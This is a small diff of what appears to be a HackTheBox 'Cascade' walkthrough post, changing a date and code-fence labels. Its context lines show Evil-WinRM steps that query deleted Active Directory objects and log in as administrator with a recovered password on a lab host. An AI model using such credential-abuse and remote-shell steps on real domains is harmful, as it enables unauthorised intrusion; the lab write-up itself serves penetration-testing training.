@@ -1,6 +1,6 @@
 ---
 title: "Cascade"
-date: 2025-06-20
+date: 2025-05-10
 categories:
   - HackTheBox
   - Active Directory
@@ -300,7 +300,7 @@ NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10        
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
 
-```bash
+```shell
 *Evil-WinRM* PS C:\> Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
 
 
@@ -346,7 +346,7 @@ baCT3r1aN00dles
 
 Enter as `administrator` via `evil-winrm`.
 
-```bash
+```shell
 $ evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles
                                         
 Evil-WinRM shell v3.7
